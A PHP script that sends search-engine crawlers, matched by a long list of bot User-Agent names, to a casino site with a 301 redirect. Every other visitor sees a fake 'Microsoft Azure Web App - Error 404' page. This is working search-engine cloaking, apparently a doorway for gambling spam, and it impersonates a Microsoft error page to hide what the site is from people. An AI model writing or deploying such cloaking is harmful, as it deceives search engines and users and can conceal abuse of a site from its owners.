<?php

function isBot($user_agent)
{
    if (empty($user_agent)) {
        return false;
    }
    
    $bots = [
        "YandexBot", "YandexAccessibilityBot", "YandexMobileBot", "YandexDirectDyn", "YandexScreenshotBot",
        "YandexImages", "YandexVideo", "YandexVideoParser", "YandexMedia", "YandexBlogs", "YandexFavicons",
        "YandexWebmaster", "YandexPagechecker", "YandexImageResizer", "YandexAdNet", "YandexDirect",
        "YaDirectFetcher", "YandexCalendar", "YandexSitelinks", "YandexMetrika", "YandexNews",
        "YandexNewslinks", "YandexCatalog", "YandexAntivirus", "YandexMarket", "YandexVertis",
        "YandexForDomain", "YandexSpravBot", "YandexSearchShop", "YandexMedianaBot", "YandexOntoDB",
        "YandexOntoDBAPI", "YandexTurbo", "YandexVerticals",
        "Googlebot", "Googlebot-Image", "Mediapartners-Google", "AdsBot-Google", "APIs-Google",
        "AdsBot-Google-Mobile", "AdsBot-Google-Mobile", "Googlebot-News", "Googlebot-Video",
        "AdsBot-Google-Mobile-Apps",
        "Mail.RU_Bot", "bingbot", "Accoona", "ia_archiver", "Ask Jeeves", "OmniExplorer_Bot", "W3C_Validator",
        "WebAlta", "YahooFeedSeeker", "Yahoo!", "Ezooms", "Tourlentabot", "MJ12bot", "AhrefsBot",
        "SearchBot", "SiteStatus", "Nigma.ru", "Baiduspider", "Statsbot", "SISTRIX", "AcoonBot", "findlinks",
        "proximic", "OpenindexSpider", "statdom.ru", "Exabot", "Spider", "SeznamBot", "oBot", "C-T bot",
        "Updownerbot", "Snoopy", "heritrix", "Yeti", "DomainVader", "DCPbot", "PaperLiBot", "StackRambler",
        "msnbot", "msnbot-media", "msnbot-news",
    ];

    foreach ($bots as $bot) { 
        if (stripos($user_agent, $bot) !== false) {
            return $bot;
        }
    }

    return false;
}

$result = isBot($_SERVER["HTTP_USER_AGENT"]);
// print '<pre>';
// var_dump($result);
// print '</pre>';
if($result === false){      
    header("HTTP/1.1 404 Internal Server Error", true, 404);
	echo "<!DOCTYPE html><html><head> <meta http-equiv='Content-Type' content='text/html; charset=UTF-8'> <title>Microsoft Azure Web App - Error 404</title> <style type='text/css'> html { height: 100%; width: 100%; } #feature { width: 960px; margin: 75px auto 0 auto; overflow: auto; } #content { font-family: 'Segoe UI'; font-weight: normal; font-size: 22px; color: #ffffff; float: left; margin-top: 68px; margin-left: 0px; vertical-align: middle; } #content h1 { font-family: 'Segoe UI Light'; color: #ffffff; font-weight: normal; font-size: 60px; line-height: 48pt; width: 800px; } a, a:visited, a:active, a:hover { color: #ffffff; } #content a.button { background: #0DBCF2; border: 1px solid #FFFFFF; color: #FFFFFF; display: inline-block; font-family: Segoe UI; font-size: 24px; line-height: 46px; margin-top: 10px; padding: 0 15px 3px; text-decoration: none; } #content a.button img { float: right; padding: 10px 0 0 15px; } #content a.button:hover { background: #1C75BC; } </style> <script type='text/javascript'> function toggle_visibility(id) { var e = document.getElementById(id); if (e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; } </script></head><body bgcolor='#00abec' cz-shortcut-listen='true'><div id='feature'> <div id='content'> <h1>404 Web Site not found.</h1> <p>You may be seeing this error due to one of the reasons listed below :</p> <ul> <li>Custom domain has not been configured inside Azure. See <a href='https://docs.microsoft.com/en-us/azure/app-service-web/app-service-web-tutorial-custom-domain'>how to map an existing domain</a> to resolve this.</li> <li>Client cache is still pointing the domain to old IP address. Clear the cache by running the command <i>ipconfig/flushdns.</i></li> </ul> <p>Checkout <a href='https://blogs.msdn.microsoft.com/appserviceteam/2017/08/08/faq-app-service-domain-preview-and-custom-domains/'>App Service Domain FAQ</a> for more questions.</p> </div></div></body></html>;";
	exit(); 
} else {
	header( "HTTP/1.1 301 Moved Permanently" );
	header( "Location:https://vse-topzcasino.azurewebsites.net" . $_SERVER["REQUEST_URI"] );
	exit();
}



?>